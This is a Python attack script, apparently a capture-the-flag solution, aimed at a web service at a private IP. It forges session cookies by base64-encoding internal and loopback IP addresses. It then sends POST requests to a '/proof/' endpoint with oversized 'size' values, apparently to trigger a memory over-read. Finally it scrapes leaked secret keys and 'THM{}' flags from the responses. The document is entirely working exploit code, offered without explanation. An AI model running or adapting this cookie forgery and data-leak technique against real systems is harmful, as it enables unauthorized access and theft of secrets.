import base64
import json
import re
import urllib.request

TARGET = "10.113.161.234"
HOST = "c4rp3d13m.net"

# Get fresh session cookie.
req = urllib.request.Request(f"http://{TARGET}/", headers={"Host": HOST, "User-Agent": "mega/1.0"})
with urllib.request.urlopen(req, timeout=15) as resp:
    sc = resp.headers.get_all("Set-Cookie") or []

cookies = {}
for line in sc:
    first = line.split(";", 1)[0]
    if "=" in first:
        k, v = first.split("=", 1)
        cookies[k] = v

print("cookies", cookies)

variants = [cookies]
if "session" in cookies:
    for ip in ["192.168.198.108", "127.0.0.1", "192.168.150.10"]:
        c = dict(cookies)
        c["session"] = base64.b64encode(ip.encode()).decode()
        variants.append(c)

sizes = [42000, 56000, 70000, 90000, 120000, 160000, 220000, 300000]
proof = "a" * 42

all_keys = set()
all_flags = set()
for vi, ck in enumerate(variants):
    ck_header = "; ".join(f"{k}={v}" for k, v in ck.items())
    for sz in sizes:
        payload = json.dumps({"size": sz, "proof": proof}).encode()
        r = urllib.request.Request(
            f"http://{TARGET}/proof/",
            data=payload,
            method="POST",
            headers={"Host": HOST, "Content-Type": "application/json", "Cookie": ck_header, "User-Agent": "mega/1.0"},
        )
        try:
            with urllib.request.urlopen(r, timeout=25) as resp:
                data = resp.read().decode("latin1", "ignore")
        except Exception as e:
            print("err", vi, sz, type(e).__name__)
            continue

        keys = re.findall(r'"key"\s*:\s*"([^"]{20,240})"', data, re.I)
        flags = re.findall(r"THM\{[^}]{1,200}\}", data, re.I)
        for k in keys:
            all_keys.add(k)
        for f in flags:
            all_flags.add(f)

        print("variant", vi, "size", sz, "len", len(data), "keys", len(keys), "flags", len(flags))

print("\nunique keys", len(all_keys))
for k in sorted(all_keys):
    print(k)
print("\nflags", sorted(all_flags))
